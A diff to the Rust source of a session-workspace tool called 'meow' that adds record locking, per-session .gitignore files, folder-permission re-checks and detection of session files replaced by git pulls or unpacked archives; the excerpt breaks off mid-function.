@@ -5,7 +5,8 @@
 //! `<folder>/meow/<name>/`, where `<folder>` is the folder meow runs from
 //! unless the user picks another; every session saved in that folder shares
 //! its `meow/`, which holds a `.gitignore` that keeps it out of git and
-//! marks it as meow's. `~/.meow/local-workspaces` remembers each one, so
+//! marks it as meow's (each session has a `.gitignore` of its own too).
+//! `~/.meow/local-workspaces` remembers each one, so
 //! `meow <name>` finds it from any folder. Older sessions stay where they
 //! were made: `~/.meow/workspaces/<name>/` (still made with `--home`) and
 //! `./.meow/` (the old `--local`). Directories are `0700` and files `0600`
@@ -1530,6 +1531,26 @@ fn is_stale(entry: &Entry) -> bool {
     }
 }
 
+/// How long a change of the record waits for another meow changing it.
+const RECORD_LOCK_WAIT: Duration = Duration::from_secs(10);
+
+/// Holds the record for one read-change-write, so two meow processes
+/// changing it at once (two terminals, a script) never drop each other's
+/// entries.
+fn lock_record(home: &MeowHome) -> Result<crate::lock::UpdateLock> {
+    create_private_dir(home.root())?;
+    let path = home.root().join(format!("{LOCAL_RECORD_FILE}.lock"));
+    crate::lock::UpdateLock::acquire(&path, RECORD_LOCK_WAIT).map_err(|error| match error {
+        crate::lock::LockError::Held { .. } => anyhow!(
+            "another meow is still changing {}; try again",
+            home.local_record_path().display()
+        ),
+        crate::lock::LockError::Io(error) => {
+            anyhow!(error).context(format!("cannot lock {}", path.display()))
+        }
+    })
+}
+
 /// Records `mark` as this user's, with the session folder when it is in a
 /// `./meow` folder. Entries that are surely stale are dropped on the way.
 /// One already recorded for that folder, however spelled, is kept as it is.
@@ -1541,6 +1562,7 @@ fn remember(home: &MeowHome, mark: &str, dir: Option<&Path>) -> Result<()> {
         mark: mark.to_owned(),
         dir: dir.filter(|dir| recordable(dir)).map(Path::to_path_buf),
     };
+    let _lock = lock_record(home)?;
     let mut entries = read_record(home);
     let known = |known: &Entry| {
         known.mark == entry.mark
@@ -1566,6 +1588,7 @@ fn remember(home: &MeowHome, mark: &str, dir: Option<&Path>) -> Result<()> {
 /// and any with its mark whose folder no longer holds it. Writes nothing
 /// when no entry goes.
 fn forget(home: &MeowHome, dir: &Path, mark: Option<&str>) -> Result<()> {
+    let _lock = lock_record(home)?;
     let mut entries = read_record(home);
     let before = entries.len();
     entries.retain(|entry| match &entry.dir {
@@ -1711,25 +1734,54 @@ fn here_session(home: &MeowHome, folder: &Path, name: &str) -> Option<Location> 
     legacy_named(home, folder, name).map(|_| Location::Legacy(folder.to_path_buf()))
 }
 
-/// Where the existing session `name` is, looked up in this order:
-/// `./meow/<name>` of `cwd`, one this user saved in another folder,
-/// `~/.meow/workspaces/<name>`, then an old `./.meow` of `cwd` with that
-/// name. `None` when there is none. Nothing is created.
-pub fn find_session(home: &MeowHome, cwd: &Path, name: &str) -> Result<Option<Location>> {
-    let name = checked_name(name)?;
-    let cwd = absolute(cwd)?;
-    if in_sessions_here(&cwd, &name) {
-        return Ok(Some(Location::Folder(cwd)));
-    }
-    if let Some(folder) = recorded_dir(home, &name)
+/// Whether `./meow/<name>` of `folder` holds a session this user made or
+/// accepted there.
+fn own_here(home: &MeowHome, folder: &Path, name: &str) -> bool {
+    let dir = sessions_dir(folder).join(name);
+    in_sessions_here(folder, name)
+        && Profile::read(&dir.join(PROFILE_FILE)).is_ok_and(|p| is_own_at(home, &p, &dir))
+}
+
+/// The user's own session `name` that is not in a folder's `./meow` they
+/// run meow from: one saved in another folder, else in `~/.meow/workspaces`.
+fn own_elsewhere(home: &MeowHome, name: &str) -> Option<Location> {
+    if let Some(folder) = recorded_dir(home, name)
         .as_deref()
         .and_then(Path::parent)
         .and_then(Path::parent)
     {
-        return Ok(Some(Location::Folder(folder.to_path_buf())));
+        return Some(Location::Folder(folder.to_path_buf()));
     }
-    if has_profile(&home.workspace_dir(&name)) {
-        return Ok(Some(Location::Home));
+    has_profile(&home.workspace_dir(name)).then_some(Location::Home)
+}
+
+/// `./meow/<name>` of `cwd` when it holds a session this user did not make
+/// or accept there (one that came with the folder).
+pub fn foreign_here(home: &MeowHome, cwd: &Path, name: &str) -> Option<PathBuf> {
+    let name = validate_name(name).ok()?;
+    let cwd = absolute(cwd).ok()?;
+    (in_sessions_here(&cwd, &name) && !own_here(home, &cwd, &name))
+        .then(|| sessions_dir(&cwd).join(name))
+}
+
+/// Where the existing session `name` is, looked up in this order:
+/// `./meow/<name>` of `cwd` when it is the user's own, one this user saved
+/// in another folder, `~/.meow/workspaces/<name>`, a `./meow/<name>` of
+/// `cwd` that came with the folder, then an old `./.meow` of `cwd` with
+/// that name. One that came with a folder never hides the user's own of
+/// that name. `None` when there is none. Nothing is created.
+pub fn find_session(home: &MeowHome, cwd: &Path, name: &str) -> Result<Option<Location>> {
+    let name = checked_name(name)?;
+    let cwd = absolute(cwd)?;
+    let here = in_sessions_here(&cwd, &name);
+    if here && own_here(home, &cwd, &name) {
+        return Ok(Some(Location::Folder(cwd)));
+    }
+    if let Some(own) = own_elsewhere(home, &name) {
+        return Ok(Some(own));
+    }
+    if here {
+        return Ok(Some(Location::Folder(cwd)));
     }
     if legacy_named(home, &cwd, &name).is_some() {
         return Ok(Some(Location::Legacy(cwd)));
@@ -1909,16 +1961,33 @@ fn secure_sessions_dir(sessions: &Path) -> Result<()> {
     if is_sessions_marker(&marker) {
         return Ok(());
     }
+    write_marker(&marker)
+}
+
+/// Gives the session folder `dir` in `./meow` a `.gitignore` of its own
+/// that keeps everything in it out of git: git reads the deepest one
+/// last, so a `.gitignore` above that lets `./meow` in (a pull can bring
+/// one) does not let the session in.
+fn secure_session_dir(dir: &Path) -> Result<()> {
+    let marker = dir.join(SESSIONS_MARKER);
+    if is_sessions_marker(&marker) {
+        return Ok(());
+    }
+    write_marker(&marker)
+}
+
+/// Writes meow's `.gitignore` at `marker`, in place of whatever is there.
+fn write_marker(marker: &Path) -> Result<()> {
     match private_open_options()
         .write(true)
         .create_new(true)
-        .open(&marker)
+        .open(marker)
     {
         Ok(mut file) => file
             .write_all(SESSIONS_MARKER_TEXT.as_bytes())
             .with_context(|| format!("cannot write {}", marker.display())),
         Err(error) if error.kind() == io::ErrorKind::AlreadyExists => {
-            write_private_atomic(&marker, SESSIONS_MARKER_TEXT.as_bytes())
+            write_private_atomic(marker, SESSIONS_MARKER_TEXT.as_bytes())
         }
         Err(error) => Err(error).with_context(|| format!("cannot create {}", marker.display())),
     }
@@ -1953,15 +2022,6 @@ fn effective_ids() -> (u32, u32) {
     unsafe { (libc::geteuid(), libc::getegid()) }
 }
 
-/// Group or others may write to a folder. The user's own group (the
-/// effective one: Linux makes one for each user) does not count.
-#[cfg(unix)]
-fn others_can_write(meta: &fs::Metadata) -> bool {
-    use std::os::unix::fs::MetadataExt;
-    let mode = meta.mode();
-    mode & 0o002 != 0 || (mode & 0o020 != 0 && meta.gid() != effective_ids().1)
-}
-
 /// The folders above `folder`, as its path names them and as they really
 /// are once links are resolved. Missing ones are left out of the second.
 fn folders_above(folder: &Path) -> Vec<PathBuf> {
@@ -1981,7 +2041,8 @@ fn folders_above(folder: &Path) -> Vec<PathBuf> {
 
 /// Why another account could swap what is in `folder` through a folder
 /// above it: one that belongs to another user (root aside), or one other
-/// users can write to without the sticky bit `/tmp` has.
+/// users can write to (through a shared group or an access list too)
+/// without the sticky bit `/tmp` has.
 #[cfg(unix)]
 fn unsafe_folder_above(folder: &Path) -> Option<&'static str> {
     use std::os::unix::fs::MetadataExt;
@@ -1993,11 +2054,64 @@ fn unsafe_folder_above(folder: &Path) -> Option<&'static str> {
         if meta.uid() != 0 && meta.uid() != me {
             return Some("a folder above it belongs to another user");
         }
-        if others_can_write(&meta) && meta.mode() & 0o1000 == 0 {
+        if meta.mode() & 0o1000 == 0 && crate::perms::others_can_change(&path, &meta) {
             return Some("other users can change a folder above it");
         }
     }
     None
+}
+
+/// The folder that holds the session in `dir`: `<folder>` of
+/// `<folder>/meow/<name>` or of an old `<folder>/.meow`. `None` for one in
+/// `~/.meow/workspaces`.
+fn holding_folder(dir: &Path) -> Option<&Path> {
+    if folder_session(dir).is_some() {
+        return dir.parent()?.parent();
+    }
+    (dir.file_name() == Some(LOCAL_DIR.as_ref()))
+        .then(|| dir.parent())
+        .flatten()
+}
+
+/// Why the folder that holds the existing session in `dir` cannot hold it
+/// any more, if it cannot: it, or one above it, is another user's, or
+/// another account could rename what is in it and put its own files there
+/// (see [`check_new_folder`]). Checked whenever a session is opened, used
+/// by a helper or deleted, not only when it was made: a folder's
+/// permissions can change after that.
+fn check_session_place(dir: &Path) -> Result<()> {
+    let Some(folder) = holding_folder(dir) else {
+        return Ok(());
+    };
+    #[cfg(unix)]
+    {
+        let reason = unsafe_folder_above(folder).map(str::to_owned).or_else(|| {
+            match fs::metadata(folder) {
+                // A new session's folder may not be made yet.
+                Err(error) if error.kind() == io::ErrorKind::NotFound => None,
+                Err(error) => Some(format!("cannot read it: {error}")),
+                Ok(meta) if verify_unix_owner_meta(&meta, folder).is_err() => {
+                    Some("it belongs to another user".to_owned())
+                }
+                Ok(meta) if crate::perms::others_can_change(folder, &meta) => {
+                    Some("other users can write to it".to_owned())
+                }
+                Ok(_) => None,
+            }
+        });
+        if let Some(reason) = reason {
+            bail!(
+                "Not using the session in {}: {reason}. Make that folder yours alone, \
+                 or delete {} yourself",
+                folder.display(),
+                dir.display()
+            );
+        }
+    }
+    // Windows: the folders' access lists are not read here (see SECURITY.md).
+    #[cfg(not(unix))]
+    let _ = folder;
+    Ok(())
 }
 
 /// Whether `path` is a session folder, or a `./meow` that holds sessions.
@@ -2074,7 +2188,7 @@ pub fn check_new_folder(home: &MeowHome, folder: &Path, name: &str) -> Result<()
                 return Err("it belongs to another user".into());
             }
             #[cfg(unix)]
-            if others_can_write(&_meta) {
+            if crate::perms::others_can_change(folder, &_meta) {
                 return Err("other users can write to it".into());
             }
             check_sessions_dir(&sessions)?;
@@ -2189,6 +2303,7 @@ impl Workspace {
                 dir.display()
             );
         }
+        check_session_place(&dir)?;
         let sessions = match location {
             Location::Home => {
                 create_private_dir(home.root())?;
@@ -2230,8 +2345,12 @@ impl Workspace {
         if !unaccepted_foreign {
             if let Some(sessions) = &sessions {
                 secure_sessions_dir(sessions)?;
+                exclude_from_git(sessions);
             }
             create_private_dir(&dir)?;
+            if sessions.is_some() {
+                secure_session_dir(&dir)?;
+            }
             create_private_subdir(&dir.join("tmp"))?;
             create_private_subdir(&dir.join("chats"))?;
             enforce_private_tree(&dir)
@@ -2266,6 +2385,7 @@ impl Workspace {
     /// Fails for a workspace that is not this user's, saying how to review
     /// or remove it from `cwd`. Helper commands call this before touching it.
     pub fn ensure_own(&self, home: &MeowHome, cwd: &Path) -> Result<()> {
+        check_session_place(&self.dir)?;
         if self.is_foreign(home) {
             let what = match commands_for(home, cwd, &self.dir, &self.name) {
                 (Some(open), Some(delete)) => format!(
@@ -2282,31 +2402,64 @@ impl Workspace {
                 self.dir.display()
             );
         }
+        // While its session runs, the session itself checked them.
+        if !crate::lock::SessionLock::is_held(&self.lock_path()) && self.files_changed(home) {
+            let open = commands_for(home, cwd, &self.dir, &self.name)
+                .0
+                .map_or_else(|| "it".to_owned(), |open| format!("it with `{open}`"));
+            bail!(
+                "Files in {} changed outside meow (a git pull or an unpacked archive?). \
+                 Open {open} first",
+                self.dir.display()
+            );
+        }
         enforce_private_tree(&self.dir)
             .with_context(|| format!("cannot restrict permissions under {}", self.dir.display()))?;
+        Ok(())
+    }
+
+    /// Fails when another session of this user's already has this one's
+    /// name: a name is one session wherever meow runs, so one that came
+    /// with a folder cannot take it.
+    pub fn check_name_free(&self, home: &MeowHome) -> Result<()> {
+        let Some(own) = own_elsewhere(home, &self.name) else {
+            return Ok(());
+        };
+        let dir = own.dir(home, &self.name)?;
+        if !same_dir(&dir, &self.dir) {
+            bail!(
+                "You already have a session named '{}' at {}. Delete one of the two, \
+                 or rename this one's folder",
+                self.name,
+                dir.display()
+            );
+        }
         Ok(())
     }
 
     /// Accepts a session that came with a folder as this user's own. Its
     /// stored mode is replaced by `mode` (the user's default), its recorded
     /// `last_cwd` is discarded, and private permissions are enforced.
+    /// Refused when the user already has a session of that name.
     pub fn adopt(&mut self, home: &MeowHome, mode: Mode) -> Result<()> {
+        self.check_name_free(home)?;
         let in_sessions_dir = folder_session(&self.dir).is_some();
         if let (true, Some(sessions)) = (in_sessions_dir, self.dir.parent()) {
             secure_sessions_dir(sessions)?;
+            exclude_from_git(sessions);
         }
         refuse_symlink(&self.dir)?;
         refuse_links_inside(&self.dir)?;
         create_private_dir(&self.dir)?;
+        if in_sessions_dir {
+            secure_session_dir(&self.dir)?;
+        }
         create_private_subdir(&self.tmp_dir())?;
         create_private_subdir(&self.chats_dir())?;
         enforce_private_tree(&self.dir)
             .with_context(|| format!("cannot restrict permissions under {}", self.dir.display()))?;
-        let _ = fs::remove_file(self.last_cwd_path());
         // A planted history could put a dangerous command one up-arrow away.
-        for shell in HISTORY_SHELLS {
-            let _ = fs::remove_file(self.history_path(shell));
-        }
+        self.drop_carried_files();
         let mark = new_mark()?;
         self.profile.id = Some(mark.clone());
         self.profile.mode = mode;
@@ -2456,6 +2609,586 @@ impl Workspace {
     }
 }
 
+// ---------------------------------------------------------------------------
+// How meow left a session's files
+// ---------------------------------------------------------------------------
+
+/// The files of a session meow reads back, which a `git pull` or `git
+/// checkout` in the folder that holds `./meow` replaces without a word (git
+/// treats ignored files as expendable), as an unpacked archive does: a
+/// command one up-arrow away, the folder the shell starts in, queued scans,
+/// hosts and findings. Chats (`chats/*`) count too.
+const READ_BACK: &[&str] = &[
+    "zsh_history",
+    "bash_history",
+    "powershell_history",
+    "last_cwd",
+    "replay.sh",
+    "graph.json",
+    "state.db",
+    "state.db-wal",
+    "state.db-journal",
+];
+/// Of those, the ones meow and the shell hooks only ever change in place,
+/// so they keep their place on disk while a session runs.
+const CHANGED_IN_PLACE: &[&str] = &["state.db", "replay.sh", "last_cwd"];
+/// The folder in `~/.meow` that keeps, for each session mark, how meow
+/// left that session's files.
+const SEEN_DIR: &str = "session-files";
+const SEEN_HEADER: &str = "meow session files 2";
+const SEEN_MAX: u64 = 4 * 1024 * 1024;
+
+/// Which file it is (its number on the device, and when it was made, 0
+/// where the file system does not say: a number can be given to a new
+/// file as soon as the old one is gone), its size, and when it was last
+/// written.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+struct FileId {
+    ino: u64,
+    born: i128,
+    size: u64,
+    written: i128,
+}
+
+impl FileId {
+    /// Whether `now` is this file as meow left it: the same size and last
+    /// write and, where the file system tells, made at the same time. A
+    /// file put in its place (a pull, an unpacked archive) is made and
+    /// written later. Device and file numbers are not compared: a remount
+    /// (an overlay after a container restart, NFS, FUSE, a FAT drive) can
+    /// change them for the same file.
+    fn unchanged(&self, now: &FileId) -> bool {
+        self.size == now.size
+            && self.written == now.written
+            && (self.born == 0 || now.born == 0 || self.born == now.born)
+    }
+
+    /// Whether `now` is still the same file on disk, written since or
+    /// not: made at the same time where the file system tells, else with
+    /// the same number. Only used within one session.
+    fn same_file(&self, now: &FileId) -> bool {
+        if self.born != 0 && now.born != 0 {
+            self.born == now.born
+        } else {
+            self.ino == now.ino
+        }
+    }
+}
+
+/// Nanoseconds since 1970 of `at`; 0 when the file system does not say.
+fn nanos(at: io::Result<SystemTime>) -> i128 {
+    at.ok()
+        .and_then(|at| at.duration_since(SystemTime::UNIX_EPOCH).ok())
+        .and_then(|since| i128::try_from(since.as_nanos()).ok())
+        .unwrap_or(0)
+}
+
+#[cfg(unix)]
+fn file_id(meta: &fs::Metadata) -> FileId {
+    use std::os::unix::fs::MetadataExt;
+    FileId {
+        ino: meta.ino(),
+        born: nanos(meta.created()),
+        size: meta.len(),
+        written: i128::from(meta.mtime()) * 1_000_000_000 + i128::from(meta.mtime_nsec()),
+    }
+}
+
+#[cfg(not(unix))]
+fn file_id(meta: &fs::Metadata) -> FileId {
+    FileId {
+        ino: 0,
+        born: nanos(meta.created()),
+        size: meta.len(),
+        written: nanos(meta.modified()),
+    }
+}
+
+/// The read-back files of a session as they are. `odd` is set by anything
+/// meow never leaves there (a link, a folder, a name it cannot record),
+/// and, in a stored one, when files were replaced during the session.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+struct Snapshot {
+    files: std::collections::BTreeMap<String, FileId>,
+    odd: bool,
+}
+
+impl Snapshot {
+    fn of(dir: &Path) -> Self {
+        let mut snapshot = Self::default();
+        for name in READ_BACK {
+            snapshot.note(name, &dir.join(name));
+        }
+        match fs::read_dir(dir.join("chats")) {
+            Ok(entries) => {
+                for entry in entries.take(MAX_TREE_ENTRIES) {
+                    let Ok(entry) = entry else {
+                        snapshot.odd = true;
+                        continue;
+                    };
+                    match entry.file_name().to_str() {
+                        Some(name) if !name.chars().any(char::is_control) => {
+                            snapshot.note(&format!("chats/{name}"), &entry.path());
+                        }
+                        _ => snapshot.odd = true,
+                    }
+                }
+            }
+            Err(error) if error.kind() == io::ErrorKind::NotFound => {}
+            Err(_) => snapshot.odd = true,
+        }
+        snapshot
+    }
+
+    fn note(&mut self, name: &str, path: &Path) {
+        match fs::symlink_metadata(path) {
+            // A read-only open of the database leaves an empty write-ahead
+            // log behind (`meow list`); an empty one holds nothing.
+            Ok(meta) if meta.is_file() && meta.len() == 0 && name == "state.db-wal" => {}
+            Ok(meta) if meta.is_file() => {
+                self.files.insert(name.to_owned(), file_id(&meta));
+            }
+            Err(error) if error.kind() == io::ErrorKind::NotFound => {}
+            _ => self.odd = true,
+        }
+    }
+
+    /// Whether `now` has a file this one does not know as it is: replaced,
+    /// rewritten or new. A file that is gone changes nothing.
+    fn differs(&self, now: &Snapshot) -> bool {
+        self.odd
+            || now.odd
+            || now
+                .files
+                .iter()
+                .any(|(name, id)| !self.files.get(name).is_some_and(|seen| seen.unchanged(id)))
+    }
+
+    /// Whether a file that is only changed in place has another place on
+    /// disk in `end` than in this one: something replaced it meanwhile.
+    fn replaced_by(&self, end: &Snapshot) -> bool {
+        end.odd
+            || self
+                .files
+                .iter()
+                .filter(|(name, _)| {
+                    CHANGED_IN_PLACE.contains(&name.as_str()) || name.starts_with("chats/")
+                })
+                .any(|(name, id)| end.files.get(name).is_some_and(|now| !id.same_file(now)))
+    }
+
+    fn to_text(&self) -> String {
+        let mut text = format!(
+            "{SEEN_HEADER}\n{}\n",
+            if self.odd { "changed" } else { "ok" }
+        );
+        for (name, id) in &self.files {
+            text.push_str(&format!(
+                "{} {} {} {} {name}\n",
+                id.ino, id.born, id.size, id.written
+            ));
+        }
+        text
+    }
+
+    /// `None` for anything meow did not write.
+    fn from_text(text: &str) -> Option<Self> {
+        let mut lines = text.lines();
+        if lines.next()? != SEEN_HEADER {
+            return None;
+        }
+        let odd = match lines.next()? {
+            "ok" => false,
+            "changed" => true,
+            _ => return None,
+        };
+        let mut files = std::collections::BTreeMap::new();
+        for line in lines {
+            let mut parts = line.splitn(5, ' ');
+            let mut number = || parts.next().and_then(|part| part.parse::<i128>().ok());
+            let (ino, born, size, written) = (number()?, number()?, number()?, number()?);
+            let id = FileId {
+                ino: u64::try_from(ino).ok()?,
+                born,
+                size: u64::try_from(size).ok()?,
+                written,
+            };
+            files.insert(parts.next()?.to_owned(), id);
+        }
+        Some(Self { files, odd })
+    }
+}
+
+fn seen_path(home: &MeowHome, mark: &str) -> PathBuf {
+    home.root().join(SEEN_DIR).join(mark)
+}
+
+/// How meow last left the files of the session `mark`. `None` when it
+/// never recorded them (a session made by an older meow).
+fn read_seen(home: &MeowHome, mark: &str) -> Option<Snapshot> {
+    let path = seen_path(home, mark);
+    match read_bounded(&path, SEEN_MAX) {
+        Ok(text) => Some(Snapshot::from_text(&text).unwrap_or(Snapshot {
+            odd: true,
+            ..Snapshot::default()
+        })),
+        Err(error) if error.kind() == io::ErrorKind::NotFound => None,
+        // Something else in its place: nothing can be trusted.
+        Err(_) => Some(Snapshot {
+            odd: true,
+            ..Snapshot::default()
+        }),
+    }
+}
+
+fn write_seen(home: &MeowHome, mark: &str, snapshot: &Snapshot) -> Result<()> {
+    create_private_dir(home.root())?;
+    create_private_dir(&home.root().join(SEEN_DIR))?;
+    write_private_atomic(&seen_path(home, mark), snapshot.to_text().as_bytes())
+}
+
+/// The git work tree `folder` is in, as its top folder and its `.git`,
+/// when that `.git` is a folder of this user's alone. `None` for a `.git`
+/// that is a link or a file (a linked work tree, a submodule).
+fn own_git(folder: &Path) -> Option<(PathBuf, PathBuf)> {
+    let folder = fs::canonicalize(folder).ok()?;
+    for top in folder.ancestors() {
+        let git = top.join(".git");
+        match fs::symlink_metadata(&git) {
+            Ok(meta) if meta.is_dir() => {
+                #[cfg(unix)]
+                if verify_unix_owner_meta(&meta, &git).is_err()
+                    || crate::perms::others_can_change(&git, &meta)
+                {
+                    return None;
+                }
+                return Some((top.to_path_buf(), git));
+            }
+            Ok(_) => return None,
+            Err(_) => continue,
+        }
+    }
+    None
+}
+
+/// Lists `./meow` in `.git/info/exclude` of the git work tree it is in.
+/// That covers a `./meow` whose `.gitignore` is gone, but a `.gitignore`
+/// in the work tree overrides it (`!/meow/` at the top): what keeps
+/// session files out is the `.gitignore` in `./meow` and in each session,
+/// which [`GitWatch`] puts back while a session runs. Best effort.
+fn exclude_from_git(sessions: &Path) {
+    let Some(folder) = sessions
+        .parent()
+        .and_then(|folder| fs::canonicalize(folder).ok())
+    else {
+        return;
+    };
+    let Some((top, git)) = own_git(&folder) else {
+        return;
+    };
+    if let Some(pattern) = folder.strip_prefix(&top).ok().and_then(exclude_pattern) {
+        let _ = add_exclude(&git.join("info"), &pattern);
+    }
+}
+
+/// The `.git/info/exclude` line for `./meow` of the folder `below` the top
+/// of the work tree: `/meow/`, `/sub/dir/meow/`. `None` for a path a
+/// pattern cannot say as one line.
+fn exclude_pattern(below: &Path) -> Option<String> {
+    let mut pattern = String::from("/");
+    for part in below.components() {
+        let std::path::Component::Normal(part) = part else {
+            return None;
+        };
+        let part = part.to_str()?;
+        if part.chars().any(char::is_control) {
+            return None;
+        }
+        for ch in part.chars() {
+            if matches!(ch, '*' | '?' | '[' | ']' | '\\') {
+                pattern.push('\\');
+            }
+            pattern.push(ch);
+        }
+        pattern.push('/');
+    }
+    pattern.push_str(SESSIONS_DIR);
+    pattern.push('/');
+    Some(pattern)
+}
+
+/// Adds `pattern` to `exclude` in the folder `info` (made private if
+/// missing), once. Never through a link, and only to a file of the user's
+/// own with one link.
+fn add_exclude(info: &Path, pattern: &str) -> Result<()> {
+    if fs::symlink_metadata(info).is_err() {
+        create_private_dir(info)?;
+    }
+    refuse_symlink(info)?;
+    let path = info.join("exclude");
+    let mut file = private_open_options()
+        .read(true)
+        .append(true)
+        .create(true)
+        .open(&path)
+        .with_context(|| format!("cannot open {}", path.display()))?;
+    let meta = file.metadata()?;
+    if !meta.is_file() {
+        bail!("{} is not a regular file", path.display());
+    }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::MetadataExt;
+        verify_unix_owner_meta(&meta, &path)?;
+        if meta.nlink() > 1 {
+            bail!("{} has a second hard link", path.display());
+        }
+    }
+    let mut text = String::new();
+    (&file).take(SEEN_MAX).read_to_string(&mut text)?;
+    if text.lines().any(|line| line.trim_end() == pattern) {
+        return Ok(());
+    }
+    let gap = if text.is_empty() || text.ends_with('\n') {
+        ""
+    } else {
+        "\n"
+    };
+    file.write_all(format!("{gap}# meow session data\n{pattern}\n").as_bytes())?;
+    Ok(())
+}
+
+/// Most session files a warning names.
+const GIT_NAMES_SHOWN: usize = 3;
+
+/// Keeps git out of a session in `./meow` while it runs: a pull can
+/// replace the `.gitignore` files that keep session files out (that of
+/// `./meow` and the session's own), or make git track session files, at
+/// any time. Each [`GitWatch::check`] puts back what was changed and says
+/// what git would take in.
+#[derive(Debug, Default)]
+pub struct GitWatch {
+    /// The work tree and its `.git` folder, once looked up.
+    repo: Option<Option<(PathBuf, PathBuf)>>,
+    /// The git index as last seen: git is asked again when it changes.
+    index: Option<Option<(u64, i128)>>,
+    /// What git was last found to take in, said once.
+    said: (Vec<String>, Vec<String>),
+}
+
+impl GitWatch {
+    /// What to tell the user about the session in `dir`, one line each.
+    pub fn check(&mut self, dir: &Path) -> Vec<String> {
+        let mut notes = Vec::new();
+        let (Some(sessions), Some(name)) = (
+            folder_session(dir).and_then(Path::parent),
+            dir.file_name().map(|name| name.to_string_lossy()),
+        ) else {
+            return notes;
+        };
+        let Some(folder) = sessions.parent() else {
+            return notes;
+        };
+        let mut changed = false;
+        for (marker, shown) in [
+            (
+                sessions.join(SESSIONS_MARKER),
+                format!("{SESSIONS_DIR}/{SESSIONS_MARKER}"),
+            ),
+            (
+                dir.join(SESSIONS_MARKER),
+                format!("{SESSIONS_DIR}/{name}/{SESSIONS_MARKER}"),
+            ),
+        ] {
+            if !is_sessions_marker(&marker) && write_marker(&marker).is_ok() {
+                notes.push(format!("{shown} had been changed; meow put its own back"));
+                changed = true;
+            }
+        }
+        let Some((_, git)) = self.repo.get_or_insert_with(|| own_git(folder)).clone() else {
+            return notes;
+        };
+        let index = fs::metadata(git.join("index"))
+            .ok()
+            .map(|meta| (meta.len(), nanos(meta.modified())));
+        if !changed && self.index == Some(index) {
+            return notes;
+        }
+        self.index = Some(index);
+        let found = (
+            git_lists(folder, &["--cached"]),
+            git_lists(folder, &["--others", "--exclude-standard"]),
+        );
+        if found == self.said {
+            return notes;
+        }
+        let shown = |names: &[String]| {
+            let mut text = names
+                .iter()
+                .take(GIT_NAMES_SHOWN)
+                .map(|name| crate::evidence::sanitize(name, 200))
+                .collect::<Vec<_>>()
+                .join(", ");
+            if names.len() > GIT_NAMES_SHOWN {
+                text.push_str(&format!(" and {} more", names.len() - GIT_NAMES_SHOWN));
+            }
+            text
+        };
+        let place = crate::evidence::sanitize(&folder.display().to_string(), 300);
+        if !found.0.is_empty() && found.0 != self.said.0 {
+            notes.push(format!(
+                "git tracks session files ({}): a commit would take them in. \
+                 Run `git rm -r --cached {SESSIONS_DIR}` in {place}",
+                shown(&found.0)
+            ));
+        }
+        if !found.1.is_empty() && found.1 != self.said.1 {
+            notes.push(format!(
+                "git does not ignore session files ({}): a .gitignore in {place} lets them in",
+                shown(&found.1)
+            ));
+        }
+        self.said = found;
+        notes
+    }
+}
+
+/// What `git ls-files <args> -- meow` lists in `folder`, git run without
+/// hooks or fsmonitor. Empty when git cannot say.
+fn git_lists(folder: &Path, args: &[&str]) -> Vec<String> {
+    let mut command = vec!["ls-files", "-z"];
+    command.extend_from_slice(args);
+    command.extend(["--", SESSIONS_DIR]);
+    crate::update::git_output(folder, &command)
+        .map(|out| {
+            out.split(|&byte| byte == 0)
+                .filter(|name| !name.is_empty())
+                .map(|name| String::from_utf8_lossy(name).into_owned())
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+impl Workspace {
+    /// The mark of a session outside `~/.meow`, when it has a valid one.
+    fn mark(&self) -> Option<&str> {
+        self.profile.id.as_deref().filter(|id| is_valid_mark(id))
+    }
+
+    /// Whether files meow reads back from this session were replaced,
+    /// rewritten or added since meow last left it: by a `git pull` or `git
+    /// checkout` in the folder that holds it, an unpacked archive, or by
+    /// hand. False for a session meow never left with this check.
+    pub fn files_changed(&self, home: &MeowHome) -> bool {
+        self.mark()
+            .and_then(|mark| read_seen(home, mark))
+            .is_some_and(|seen| seen.differs(&Snapshot::of(&self.dir)))
+    }
+
+    /// Drops what a file put in the session could abuse: the shell
+    /// histories (a command one up-arrow away) and `last_cwd`.
+    pub fn drop_carried_files(&self) {
+        let _ = fs::remove_file(self.last_cwd_path());
+        for shell in HISTORY_SHELLS {
+            let _ = fs::remove_file(self.history_path(shell));
+        }
+    }
+}
+
+/// Records, when dropped, how meow leaves the files of a session it used,
+/// in `~/.meow`, so that opening it next time tells whether something else
+/// changed them since ([`Workspace::files_changed`]).
+#[derive(Debug)]
+pub struct SessionFiles {
+    home: MeowHome,
+    dir: PathBuf,
+    mark: Option<String>,
+    /// For a helper: nothing is recorded while a session holds the lock;
+    /// that session records its files when it ends.
+    helper: bool,
+    /// The files as the session found them, to tell whether one meow only
+    /// changes in place was replaced while it ran.
+    start: Option<Snapshot>,
+    /// Files that may not be the user's (the session came with the folder,
+    /// or they changed outside meow) count as meow's only once the session
+    /// has started ([`SessionFiles::started`]).
+    doubtful: bool,
+    started: bool,
+}
+
+impl SessionFiles {
+    /// For the session this process holds the lock of, taken before
+    /// anything of it is used. Drop it once the shell and the coordinator
+    /// have stopped and the database is closed. `doubtful`: see
+    /// [`SessionFiles::started`].
+    pub fn for_session(home: &MeowHome, workspace: &Workspace, doubtful: bool) -> Self {
+        let mut files = Self::new(home, workspace, false);
+        files.start = Some(Snapshot::of(&workspace.dir));
+        files.doubtful = doubtful;
+        files.started = false;
+        files
+    }
+
+    /// For a helper command run on `workspace` without its session. Files
+    /// that had changed outside meow before it ran are left so: only
+    /// opening the session takes them in.
+    pub fn for_helper(home: &MeowHome, workspace: &Workspace) -> Self {
+        let mut files = Self::new(home, workspace, true);
+        if workspace.files_changed(home) {
+            files.mark = None;
+        }
+        files
+    }
+
+    fn new(home: &MeowHome, workspace: &Workspace, helper: bool) -> Self {
+        Self {
+            home: home.clone(),
+            dir: workspace.dir.clone(),
+            mark: workspace.mark().map(str::to_owned),
+            helper,
+            start: None,
+            doubtful: false,
+            started: true,
+        }
+    }
+
+    /// Says that the session has started: the user saw the warnings and
+    /// answered about its queued scans, and its shell runs. Until then, a
+    /// `doubtful` session that ends (a failed start, an error) is recorded
+    /// as changed outside meow, so the next open warns again.
+    pub fn started(&mut self) {
+        self.started = true;
+    }
+
+    fn record(&self) -> Result<()> {
+        let Some(mark) = &self.mark else {
+            return Ok(());
+        };
+        if self.helper && crate::lock::SessionLock::is_held(&self.dir.join(LOCK_FILE)) {
